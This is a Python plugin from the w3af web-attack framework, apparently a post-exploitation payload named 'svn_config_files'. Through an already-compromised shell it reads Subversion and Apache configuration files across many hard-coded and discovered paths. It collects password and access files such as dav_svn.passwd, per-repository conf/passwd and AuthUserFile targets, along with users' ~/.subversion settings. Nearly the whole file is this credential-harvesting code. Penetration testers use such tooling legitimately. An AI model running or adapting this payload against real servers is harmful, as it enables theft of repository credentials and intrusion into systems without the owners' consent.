import re
import w3af.core.data.kb.knowledge_base as kb
from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class svn_config_files(Payload):
    """
    This payload shows SVN Server configuration files
    """
    def fname_generator(self, users_info, apache_config_directory,
                        apache_config_files):
        yield '/etc/httpd/conf.d/subversion.conf'
        yield '/etc/httpd/conf.d/viewvc.conf'
        yield '/etc/viewvc/viewvc.conf'
        yield '/opt/viewvc/viewvc.conf'
        yield '/etc/httpd/conf.d/statsvn.conf'
        yield '/srv/trac/projectX/conf/trac.ini'
        yield '/etc/apache2/conf.d/subversion.conf'
        yield '/etc/apache2/dav_svn.passwd'
        yield '/etc/apache2/dav_svn.password'
        yield '/etc/apache2/httpd.conf'
        yield '/etc/apache2/svn.conf'
        yield '/etc/subversion/conf/svnserve.conf'
        yield '/usr/local/subversion/conf/httpd.conf'
        yield '/etc/sasl/subversion.conf'
        yield '/var/local/svn/conf/svnserve.conf'
        yield '/srv/svn/repositories/svntest/conf/svnserve.conf'
        yield '/var/svn/conf/commit-access-control.cfg'
        yield '/etc/subversion/hairstyles'
        yield '/etc/subversion/servers'
        yield '/etc/subversion/config'

        for user in users_info:
            directory = users_info[user]['home']

            yield directory + '.subversion/config'
            yield directory + '.subversion/config_backup'
            yield directory + '.subversion/servers'
            yield directory + '.subversion/hairstyles'
            yield directory + '/conf/svnserve.conf'
            yield directory + '/conf/passwd'

        for directory in apache_config_directory:
            yield directory + 'mods-enabled/dav_svn.conf'

        for folder in kb.kb.raw_read('password_profiling', 'password_profiling'):
            yield '/srv/svn/' + folder.lower() + '/conf/svnserve.conf'
            yield '/srv/svn/' + folder.lower() + '/conf/passwd'

        for file_path in apache_config_files:
            yield file_path

    def api_read(self):
        self.result = {}

        def parse_parent_path(config):
            parent_path = re.findall(
                '^(?<=SVNParentPath )(.*)', config, re.MULTILINE)
            if parent_path:
                return parent_path
            else:
                return []

        def parse_path(config):
            path = re.findall('(?<=^SVNPath )(.*)', config, re.MULTILINE)
            if path:
                return path
            else:
                return []

        def parse_auth_files(config):
            auth = re.findall('(?<=AuthUserFile )(.*)', config, re.MULTILINE)
            auth2 = re.findall(
                '(?<=AccessFileName )(.*)', config, re.MULTILINE)
            if auth and auth2:
                return auth + auth2
            if auth:
                return auth
            if auth2:
                return auth2
            else:
                return []

        def multi_parser(self, file, file_content, only_parse=False):
            parent_path = parse_parent_path(file_content)
            if parent_path:
                for file_parsed in parent_path:
                    parent_path_content = self.shell.read(file_parsed)
                    if parent_path_content:
                        self.result[file_parsed] = parent_path_content

            path = parse_path(file_content)
            if path:
                for file_parsed in path:
                    path_content = self.shell.read(file_parsed)
                    if path_content:
                        self.result[file_parsed] = path_content

            auth = parse_auth_files(file_content)
            if auth:
                for file_parsed in auth:
                    auth_content = self.shell.read(file_parsed)
                    if auth_content:
                        self.result[file_parsed] = auth_content
            if not only_parse:
                self.result[file] = file_content

        users_info = self.exec_payload('users')
        apache_config_directory = self.exec_payload(
            'apache_config_directory')['apache_directory']
        apache_config_files = self.exec_payload(
            'apache_config_files')['apache_config']
        fname_iter = self.fname_generator(users_info, apache_config_directory,
                                          apache_config_files)

        for file_path, file_content in self.read_multi(fname_iter):
            if file_content:
                multi_parser(self, file_path, file_content)

        return self.result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'SVN configuration files not found.'
        else:
            rows = []
            rows.append(['SVN configuration files'])
            rows.append([])

            for filename in api_result:
                rows.append([filename, ])

            result_table = table(rows)
            result_table.draw(80)
            return rows
